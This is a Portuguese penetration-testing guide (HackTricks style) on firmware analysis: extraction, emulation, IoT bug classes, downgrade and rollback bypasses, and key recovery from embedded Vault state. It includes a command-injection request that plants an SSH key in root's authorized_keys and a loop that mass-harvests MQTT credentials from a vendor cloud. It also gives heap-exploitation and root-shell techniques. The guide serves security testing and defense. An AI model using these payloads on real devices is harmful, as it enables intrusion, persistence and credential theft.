# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introdução**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware é um software essencial que permite que os dispositivos operem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções vitais desde o momento em que é ligado, levando ao carregamento do sistema operacional. Examinar e potencialmente modificar o firmware é uma etapa crítica na identificação de vulnerabilidades de segurança.<sup>[[2]](#references)[[3]](#references)</sup>

## **Coleta de informações**

A **coleta de informações** é uma etapa inicial crítica para compreender a composição de um dispositivo e as tecnologias que ele utiliza. Esse processo envolve coletar dados sobre:

- A arquitetura da CPU e o sistema operacional executado
- Especificidades do bootloader
- Layout do hardware e datasheets
- Métricas da base de código e locais do código-fonte
- Bibliotecas externas e tipos de licença
- Históricos de atualizações e certificações regulatórias
- Diagramas de arquitetura e fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para esse propósito, as ferramentas de **open-source intelligence (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis por meio de processos de revisão manuais e automatizados. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser utilizada para encontrar possíveis problemas.

## **Obtendo o Firmware**

A obtenção de firmware pode ser realizada de várias maneiras, cada uma com seu próprio nível de complexidade:

- **Diretamente** da fonte (desenvolvedores, fabricantes)
- **Compilando-o** a partir das instruções fornecidas
- **Baixando-o** de sites oficiais de suporte
- Utilizando consultas de **Google dork** para encontrar arquivos de firmware hospedados
- Acessando diretamente o **cloud storage**, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **atualizações** por meio de técnicas man-in-the-middle
- **Extraindo-o** do dispositivo por meio de conexões como **UART**, **JTAG** ou **PICit**
- **Capturando** solicitações de atualização na comunicação do dispositivo
- Identificando e usando **endpoints de atualização hardcoded**
- **Despejando** o conteúdo do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando todo o resto falhar, usando as ferramentas de hardware apropriadas

### Logs somente de UART: force um root shell usando o ambiente do U-Boot no flash

Se o UART RX for ignorado (somente logs), ainda é possível forçar um init shell **editando offline o blob do ambiente do U-Boot**:<sup>[[6]](#references)</sup>

1. Faça o dump do SPI flash com um clip SOIC-8 + programador (3,3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localize a partição do ambiente do U-Boot, edite `bootargs` para incluir `init=/bin/sh` e **recalcule o CRC32 do ambiente do U-Boot** para o blob.
3. Regrave somente a partição do ambiente e reinicie; um shell deverá aparecer no UART.

Isso é útil em dispositivos embedded nos quais o shell do bootloader está desabilitado, mas a partição de ambiente pode ser gravada por meio de acesso externo ao flash.

## Analisando o firmware

Agora que você **tem o firmware**, é necessário extrair informações sobre ele para saber como tratá-lo. Existem diferentes ferramentas que podem ser usadas para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se não encontrar muita coisa com essas ferramentas, verifique a **entropia** da imagem com `binwalk -E <bin>`. Se a entropia for baixa, provavelmente ela não estará criptografada. Se a entropia for alta, é provável que esteja criptografada (ou comprimida de alguma forma).

Além disso, você pode usar estas ferramentas para extrair **arquivos incorporados no firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou o [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o sistema de arquivos

Com as ferramentas comentadas anteriormente, como `binwalk -ev <bin>`, você deve ter conseguido **extrair o sistema de arquivos**.\
O Binwalk geralmente o extrai dentro de uma **pasta nomeada de acordo com o tipo de sistema de arquivos**, que normalmente é um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração manual do sistema de arquivos

Às vezes, o binwalk **não terá o byte mágico do sistema de arquivos em suas assinaturas**. Nesses casos, use o binwalk para **encontrar o deslocamento do sistema de arquivos, extrair o sistema de arquivos compactado** do binário e **extrair manualmente** o sistema de arquivos de acordo com seu tipo, usando as etapas abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **comando dd** para extrair o sistema de arquivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Como alternativa, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos estarão no diretório "`squashfs-root`" posteriormente.

- Arquivos de archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para filesystems jffs2

`$ jefferson rootfsfile.jffs2`

- Para filesystems ubifs com flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando o Firmware

Assim que o firmware for obtido, é essencial dissecá-lo para compreender sua estrutura e suas possíveis vulnerabilidades. Esse processo envolve utilizar várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de Análise Inicial

Um conjunto de comandos é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e compreender os detalhes das partições e do filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o status de criptografia da imagem, a **entropia** é verificada com `binwalk -E <bin>`. Uma entropia baixa sugere ausência de criptografia, enquanto uma entropia alta indica possível criptografia ou compressão.

Para extrair **arquivos incorporados**, são recomendadas ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e o **binvis.io** para inspeção de arquivos.

### Extraindo o Sistema de Arquivos

Usando `binwalk -ev <bin>`, geralmente é possível extrair o sistema de arquivos, frequentemente para um diretório nomeado de acordo com o tipo de sistema de arquivos (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** não consegue reconhecer o tipo de sistema de arquivos devido à ausência de magic bytes, a extração manual é necessária. Isso envolve usar o `binwalk` para localizar o offset do sistema de arquivos e, em seguida, o comando `dd` para fazer o carving do sistema de arquivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Posteriormente, dependendo do tipo de filesystem (por exemplo, squashfs, cpio, jffs2, ubifs), diferentes comandos são usados para extrair manualmente o conteúdo.

### Análise do Filesystem

Com o filesystem extraído, começa a busca por falhas de segurança. A atenção é direcionada a network daemons inseguros, credenciais hardcoded, endpoints de API, funcionalidades de update server, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Principais localizações** e **itens** a serem inspecionados incluem:

- **etc/shadow** e **etc/passwd** para obter credenciais de usuários
- Certificados e chaves SSL em **etc/ssl**
- Arquivos de configuração e scripts em busca de possíveis vulnerabilidades
- Binários incorporados para análise adicional
- Web servers e binários comuns de dispositivos IoT

Várias ferramentas ajudam a revelar informações sensíveis e vulnerabilidades dentro do filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar informações sensíveis
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para uma análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Verificações de segurança em binários compilados

Tanto o código-fonte quanto os binários compilados encontrados no filesystem devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários desprotegidos que poderiam ser explorados.

## Coleta de configurações cloud e credenciais MQTT por meio de tokens de URL derivados

Muitos hubs IoT obtêm sua configuração específica de cada dispositivo a partir de um endpoint cloud semelhante a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante a análise de firmware, você pode descobrir que o `<token>` é derivado localmente do ID do dispositivo usando um segredo hardcoded, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) e representado como hexadecimal em maiúsculas

Esse design permite que qualquer pessoa que descubra um deviceId e o STATIC_KEY reconstrua a URL e obtenha a configuração cloud, frequentemente revelando credenciais MQTT em texto simples e prefixos de tópicos.

Fluxo de trabalho prático:

1) Extraia o deviceId dos logs de inicialização UART

- Conecte um adaptador UART de 3,3 V (TX/RX/GND) e capture os logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure por linhas que imprimam o padrão da URL da cloud e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY e o algoritmo do token a partir do firmware

- Carregue os binários no Ghidra/radare2 e pesquise pelo caminho de configuração ("/pf/") ou pelo uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Derive o token no Bash e converta o digest para maiúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Coletar a configuração da cloud e as credenciais MQTT

- Componha a URL e obtenha o JSON com curl; analise-o com jq para extrair os secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Explore o MQTT em texto simples e ACLs fracas de tópicos (se presentes)

- Use as credenciais recuperadas para se inscrever em tópicos de manutenção e procurar eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumere IDs de dispositivos previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes OUI/produto/tipo do fornecedor, seguidos por um sufixo sequencial.
- Você pode iterar pelos IDs candidatos, derivar tokens e buscar configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Sempre obtenha autorização explícita antes de tentar realizar enumeração em massa.
- Dê preferência à emulação ou à análise estática para recuperar secrets sem modificar o hardware alvo, quando possível.


O processo de emulação de firmware permite realizar **análise dinâmica** da operação de um dispositivo ou de um programa individual. Essa abordagem pode encontrar desafios relacionados às dependências de hardware ou arquitetura, mas transferir o sistema de arquivos raiz ou binários específicos para um dispositivo com arquitetura e endianness compatíveis, como um Raspberry Pi, ou para uma máquina virtual pré-criada, pode facilitar testes adicionais.

### Emulando Binários Individuais

Para examinar programas individuais, é essencial identificar o endianness e a arquitetura da CPU do programa.

#### Exemplo com a Arquitetura MIPS

Para emular um binário de arquitetura MIPS, pode-se usar o comando:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` é utilizado, e para binários little-endian, `qemu-mipsel` seria a escolha.

#### Emulação de Arquitetura ARM

Para binários ARM, o processo é semelhante, com o emulador `qemu-arm` sendo utilizado para a emulação.

### Emulação de Sistema Completo

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e outras facilitam a emulação completa de firmware, automatizando o processo e auxiliando na análise dinâmica.

## Análise Dinâmica na Prática

Nesta etapa, um ambiente de dispositivo real ou emulado é usado para análise. É essencial manter acesso ao shell do sistema operacional e ao filesystem. A emulação pode não reproduzir perfeitamente as interações com o hardware, exigindo reinicializações ocasionais da emulação. A análise deve revisitar o filesystem, explorar páginas da web e serviços de rede expostos e investigar vulnerabilidades do bootloader. Testes de integridade do firmware são essenciais para identificar possíveis vulnerabilidades de backdoor.

## Técnicas de Análise em Runtime

A análise em runtime envolve interagir com um processo ou binário em seu ambiente operacional, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades por meio de fuzzing e outras técnicas.

Para targets embarcados sem um debugger completo, **copie um `gdbserver` linked estaticamente** para o dispositivo e conecte-se remotamente:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapeamento de mensagens Zigbee / radio-co-processor

Em hubs IoT, a stack de RF geralmente é dividida entre um **radio MCU** e um processo de userland Linux. Um workflow útil é mapear o caminho:<sup>[[8]](#references)</sup>

1. **RF frame** no ar
2. **controller-side parser** no radio MCU
3. **serial/UART text or TLV protocol** encaminhado ao Linux (por exemplo, `/dev/tty*`)
4. **application dispatcher** no daemon principal
5. **protocol-specific handler / state machine**

Essa arquitetura cria dois alvos de reversing em vez de um. Se o controller converter radio frames binários em um protocolo textual como `Group,Command,arg1,arg2,...`, recupere:

- Os **message groups** e as tabelas de dispatch
- Quais mensagens podem vir da **network** e quais podem vir do próprio controller
- Os campos exatos de **manufacturer-specific discriminator** (por exemplo, Zigbee `manufacturer_code` e `cluster_command` customizado)
- Quais handlers só podem ser alcançados durante as fases de **commissioning**, discovery ou download de firmware/model

Especificamente para Zigbee, capture o tráfego de pairing e verifique se o alvo ainda depende da **Link Key** padrão `ZigBeeAlliance09`. Nesse caso, sniffing do tráfego de commissioning pode expor a **Network Key**. Os install codes do Zigbee 3.0 reduzem essa exposição; portanto, observe se o dispositivo testado realmente os aplica.

### Protocol handlers específicos do fabricante e reachability controlada por FSM

Comandos Zigbee/ZCL específicos do vendor geralmente são um alvo melhor do que clusters padronizados, pois alimentam **custom parsing code** e **FSMs** internos com validação menos testada.<sup>[[8]](#references)</sup>

Workflow prático:

- Faça reversing do command dispatcher até encontrar o **vendor-only handler**.
- Recupere as tabelas de **FSM state**, **event**, **check**, **action** e **next-state**.
- Identifique **transitional states** que avançam automaticamente e branches de retry/error que eventualmente resetam ou liberam estado controlado pelo atacante.
- Confirme quais trocas legítimas de protocolo são necessárias para colocar o daemon no estado vulnerável, em vez de presumir que o handler com bug está sempre alcançável.

Para protocolos sensíveis a timing, o packet replay a partir de um framework Python pode ser lento demais. Uma abordagem mais confiável é emular um dispositivo legítimo em hardware real (por exemplo, um **nRF52840**) com uma stack de nível vendor, para expor os **endpoints**, **attributes** e o timing correto de commissioning.

### Classe de bugs de fragmented-download em daemons embarcados

Uma classe recorrente de bugs de firmware aparece em downloads fragmentados de **blob/model/configuration**:<sup>[[8]](#references)</sup>

1. O **first fragment** (`offset == 0`) armazena `ctx->total_size` e aloca `malloc(total_size)`.
2. Os fragments seguintes validam apenas campos **packet-local** controlados pelo atacante, como `packet_total_size >= offset + chunk_len`.
3. A cópia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sem verificar o tamanho originalmente alocado.

Isso permite que um atacante envie:

- Um primeiro fragmento válido com um **small** total size declarado, forçando uma pequena alocação no heap.
- Um fragmento posterior com o **expected offset**, mas com um `chunk_len` maior.
- Um tamanho packet-local forjado que satisfaz as verificações atuais, mas ainda causa overflow do buffer originalmente alocado.

Quando o caminho vulnerável está atrás de lógica de commissioning, a exploração deve incluir **device emulation** suficiente para conduzir o alvo ao estado esperado de model-download ou blob-download antes de enviar os fragments malformados.

### Gatilhos de `free()` controlados pelo protocolo

Em daemons embarcados, a forma mais fácil de acionar heap metadata exploitation geralmente não é "aguardar a limpeza", mas **forçar o próprio error handling do protocolo**:<sup>[[8]](#references)</sup>

- Envie fragments de follow-up malformados para levar a FSM aos estados de **retry** ou **error**.
- Exceda o limite de retry para que o daemon **resete o contexto** e libere o buffer corrompido.
- Use esse `free()` previsível para acionar primitives do allocator antes que o processo sofra um crash por motivos não relacionados.

Isso é especialmente útil contra allocators **musl/uClibc/dlmalloc-like** no Linux embarcado, nos quais corromper chunk metadata pode transformar a lógica de unlink/unbin em uma write primitive. Um padrão estável é corromper um **size field** para redirecionar a travessia do allocator para **fake chunks staged inside the overflowed buffer**, em vez de sobrescrever imediatamente bin pointers reais e causar o crash do processo.

## Binary Exploitation e Proof-of-Concept

Desenvolver um PoC para vulnerabilidades identificadas exige um entendimento profundo da arquitetura do alvo e programação em linguagens de nível mais baixo. Proteções de runtime binário em sistemas embarcados são raras, mas, quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

### Notas sobre uClibc fastbin exploitation (Linux embarcado)

- **Fastbins + consolidation:** o uClibc usa fastbins semelhantes aos do glibc. Uma alocação grande posterior pode acionar `__malloc_consolidate()`, portanto qualquer fake chunk deve sobreviver às verificações (tamanho válido, `fd = 0` e chunks adjacentes considerados "in use").<sup>[[6]](#references)</sup>
- **Binaries non-PIE sob ASLR:** se o ASLR estiver habilitado, mas o binário principal for **non-PIE**, os endereços de `.data/.bss` dentro do binário serão estáveis. É possível selecionar uma região que já se pareça com um header válido de heap chunk para fazer uma alocação fastbin cair sobre uma **function pointer table**.
- **Parser-stopping NUL:** quando o JSON é analisado, um `\x00` no payload pode interromper o parsing e manter bytes controlados pelo atacante após ele para um stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** uma ROP chain que chama `open("/proc/self/mem")`, `lseek()` e `write()` pode inserir shellcode executável em um mapping conhecido e saltar para ele.

## Sistemas Operacionais Preparados para Análise de Firmware

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## OSs Preparados para analisar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): o AttifyOS é uma distro destinada a ajudar na realização de security assessment e penetration testing de dispositivos Internet of Things (IoT). Ele economiza bastante tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias carregadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operacional de testes de segurança embarcada baseado no Ubuntu 18.04 e pré-carregado com ferramentas de testes de segurança de firmware.

## Firmware Downgrade Attacks e Mecanismos Inseguros de Update

Mesmo quando um vendor implementa verificações de assinatura criptográfica para imagens de firmware, a **proteção contra version rollback (downgrade)** é frequentemente omitida. Quando o boot- ou recovery-loader verifica apenas a assinatura com uma chave pública incorporada, mas não compara a *version* (ou um contador monotônico) da imagem que está sendo gravada, um atacante pode instalar legitimamente um **firmware mais antigo e vulnerável que ainda possui uma assinatura válida** e, assim, reintroduzir vulnerabilidades corrigidas.<sup>[[4]](#references)</sup>

Workflow típico de ataque:

1. **Obtenha uma imagem antiga assinada**
* Baixe-a do portal público de download, CDN ou site de suporte do vendor.
* Extraia-a de companion mobile/desktop applications (por exemplo, dentro de um Android APK em `assets/firmware/`).
* Recupere-a de repositórios de terceiros, como VirusTotal, arquivos da Internet, fóruns etc.
2. **Faça upload ou disponibilize a imagem ao dispositivo** por meio de qualquer update channel exposto:
* Web UI, mobile-app API, USB, TFTP, MQTT etc.
* Muitos dispositivos IoT de consumo expõem endpoints HTTP(S) *não autenticados* que aceitam blobs de firmware codificados em Base64, fazem o decode no lado do servidor e acionam recovery/upgrade.
3. Após o downgrade, explore uma vulnerabilidade corrigida na versão mais recente (por exemplo, um filtro de command-injection adicionado posteriormente).
4. Opcionalmente, grave novamente a imagem mais recente ou desabilite os updates para evitar detecção após obter persistência.

### Exemplo: Command Injection após Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
No firmware vulnerável (downgraded), o parâmetro `md5` é concatenado diretamente em um comando shell sem sanitização, permitindo a injeção de comandos arbitrários (neste caso, habilitando o acesso root baseado em chave SSH). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção ineficaz.<sup>[[4]](#references)</sup>

### Extraindo Firmware de Aplicativos Móveis

Muitos vendors incluem imagens completas de firmware em seus aplicativos móveis companion, para que o aplicativo possa atualizar o dispositivo via Bluetooth/Wi-Fi. Esses pacotes normalmente são armazenados sem criptografia no APK/APEX, em caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra` ou até mesmo o simples `unzip` permitem extrair imagens assinadas sem tocar no hardware físico.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass de anti-rollback somente no updater em designs de slots A/B

Alguns vendors implementam um **ratchet** anti-downgrade, mas somente dentro da lógica do *updater* (por exemplo, uma rotina UDS sobre CAN, um comando de recovery ou um agente OTA em userspace). Se o **bootloader** verificar posteriormente apenas a assinatura/CRC da imagem e confiar na tabela de partições ou nos metadados do slot, a proteção contra rollback ainda poderá ser bypassada.<sup>[[7]](#references)</sup>

Design fraco típico:

- Os metadados do firmware contêm um descritor de versão e um **security ratchet** / contador monotônico.
- O updater compara o ratchet da imagem com um valor armazenado no armazenamento persistente e rejeita imagens assinadas mais antigas.
- O bootloader **não** analisa esse ratchet e apenas verifica o header, o CRC e a assinatura antes de inicializar o slot selecionado.
- A ativação do slot é armazenada separadamente em uma tabela de partições ou em um contador de geração por slot e **não é vinculada criptograficamente** ao digest exato do firmware que foi validado.

Isso cria uma primitiva de **validar uma imagem / inicializar outra imagem** em sistemas de dois slots. Se o atacante conseguir fazer o updater marcar o slot B como próximo alvo de boot usando uma imagem assinada atual e puder sobrescrever o slot B antes do reboot, o bootloader ainda poderá inicializar a imagem downgraded, pois confia apenas nos metadados de slot já confirmados.

Padrão comum de abuso:

1. Faça upload de um firmware **atual e assinado** no slot passivo e execute a rotina normal de validação/troca para que o layout marque esse slot como o próximo ativo.
2. **Ainda não faça reboot**. Entre novamente na rotina de preparação/erase do slot na mesma sessão.
3. Abuse da lógica de estado de boot obsoleto ou de seleção de slot obsoleta para que o updater apague o **mesmo slot físico** que acabou de ser promovido.
4. Grave um firmware **mais antigo, mas ainda assinado** nesse slot.
5. Ignore a rotina de validação que aplica o ratchet e faça reboot diretamente.
6. O bootloader seleciona o slot promovido, verifica apenas a assinatura/integridade e inicializa a imagem antiga.

Itens a procurar ao fazer reversing de implementações de update A/B:

- Seleção de slot derivada de **flags de boot** que não são atualizadas após uma troca bem-sucedida.
- Uma rotina no estilo `prepare_passive_slot()` que apaga um slot com base em estado obsoleto, em vez do **layout confirmado atual**.
- Uma função no estilo `part_write_layout()` que apenas incrementa um **contador de geração** / flag de ativo e não armazena o hash da imagem validada.
- Verificações de ratchet implementadas em userspace ou no código do updater, mas **não** na ROM / bootloader / etapas de secure boot.
- Rotinas de erase ou recovery que deixam o slot marcado como inicializável mesmo depois de seu conteúdo ser removido e regravado.

### Checklist para avaliar a lógica de update

* O transporte/autenticação do *update endpoint* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **números de versão** ou um **contador monotônico anti-rollback** antes do flashing?
* A imagem é verificada dentro de uma secure boot chain (por exemplo, assinaturas verificadas pelo código da ROM)?
* O **bootloader aplica o mesmo ratchet** que o updater, em vez de verificar apenas assinatura/CRC?
* Os metadados de ativação do slot estão **vinculados ao digest/versão do firmware validado** ou um slot pode ser modificado após a promoção?
* Depois que uma troca de slot é concluída com sucesso, o dispositivo é forçado a reiniciar ou as rotinas posteriores de update/erase ainda podem ser acessadas na mesma sessão?
* O código em userland executa verificações de sanidade adicionais (por exemplo, mapa de partições permitido, número do modelo)?
* Os fluxos de update *partial* ou *backup* reutilizam a mesma lógica de validação?

> 💡  Se qualquer um dos itens acima estiver ausente, a plataforma provavelmente estará vulnerável a ataques de rollback.

## Firmware vulnerável para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulnerável como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperando chaves de decryption de firmware a partir do estado de KMS/Vault incorporado

Quando uma imagem de update mistura pequenos metadados em plaintext com um grande blob de alta entropia, faça a triagem do container antes de tentar qualquer brute force:<sup>[[1]](#references)</sup>

- Extraia headers, offsets e limites de linha com `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` geralmente significa o formato `enc` do OpenSSL: os 8 bytes seguintes são o salt e os bytes restantes são o ciphertext.
- Um campo Base64 que decodifica exatamente para `256` bytes é um forte indício de que você está analisando um ciphertext RSA-2048 que encapsula uma senha/chave de sessão aleatória do firmware.
- Material PGP detached no mesmo arquivo frequentemente protege apenas a autenticidade; não presuma que seja o mecanismo de confidentiality.

Se a busca estática por chaves (`grep`, `strings`, buscas por PEM/PGP) falhar, faça reversing do **caminho operacional de decrypt** em vez de apenas procurar private keys:

- Faça decompile do updater / binário de gerenciamento e rastreie quem lê o blob criptografado, qual helper/API faz o unwrap e qual nome lógico de chave ele solicita.
- Procure no root filesystem extraído por estado do KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), além de unit files e init scripts.
- Trate comandos plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ou scripts locais de auto-unseal do KMS como equivalentes a material de private key.

Se o appliance fornecer o binário original do Vault e o backend de storage, reproduzir esse ambiente geralmente é mais fácil do que reimplementar os internals do Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Com root no KMS clonado:

- Torne as transit keys exportable somente dentro do clone isolado: `vault write transit/keys/<name>/config exportable=true`
- Exporte a unwrap key: `vault read transit/export/encryption-key/<name>`
- Tente usar a chave RSA recuperada com o par exato de padding/hash utilizado pelo KMS. Uma descriptografia PKCS#1 v1.5 malsucedida e uma descriptografia OAEP padrão malsucedida **não** provam que a chave está errada; muitos fluxos baseados em Vault usam OAEP com SHA-256, enquanto bibliotecas comuns usam SHA-1 por padrão.
- Se o payload começar com `Salted__`, reproduza exatamente o KDF do OpenSSL usado pelo fornecedor (`EVP_BytesToKey`, frequentemente MD5 em appliances legados) antes de tentar a descriptografia AES-CBC.

Isso transforma o problema de "firmware encrypted" em um problema mais geral: **recupere as operational keys do appliance e, em seguida, reproduza offline exatamente os parâmetros de unwrap + KDF**.

## Treinamento e Certificações

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

